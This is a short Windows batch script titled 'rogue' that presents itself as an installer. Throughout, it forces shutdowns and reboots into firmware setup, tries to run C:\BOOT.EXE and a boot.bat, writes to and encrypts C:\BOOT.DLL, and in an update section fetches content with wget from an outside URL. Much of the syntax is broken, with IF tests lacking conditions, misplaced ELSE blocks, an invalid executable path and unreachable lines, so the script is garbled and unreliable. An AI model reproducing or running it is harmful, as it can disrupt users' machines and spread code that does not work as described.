@echo on

mkdir distilled



@echo off
title rogue
IF %ROGUE_PATH% if %1=="upgrade" (
    SET /A VER=%VERSION%%ROGUE_PATH%
)
IF %ROGUE_PATH% (
    @echo on
	goto restart_sys
)
ELSE(
SET /A ROGUE_PATH=%PATH%

@echo on
goto restart_sys
)

:final_setup


IF exist C:\%ROGUE_PATH\boot.bat (

C:\%ROGUE_PATH%\boot.bat


title install rogue
)
ELSE(
shutdown /r /f /fw /e /t 10 /c "unable to boot, restarting pc to firmware user interface (FUI)" /d 2:2
)
:restart_sys

shutdown /s /f /t 20 /c "restarting in 20 seconds to continue installation"


IF exist C:\BOOT.EXE (
.\C:\BOOT.EXE
)
ELSE (
shutdown /r /f /fw /e /t 10 /c "unable to run rogue boot (C:\BOOT.EXE), restarting pc to firmware user interface (FUI)" /d 2:2
)

echo diskcomp >> "C:\BOOT.DLL"
if defined PATH (
cipher /E "C:\BOOT.DLL"
goto final_setup
cipher /D "C:\BOOT.DLL"
)
ELSE (
shutdown /r /f /fw /e /t 10 /c "unable to set user path to sandboxed setup, restarting pc to firmware user interface (FUI)" /d 2:2
)



:update
if defined %2 (
	wget "https://j-tech"
)
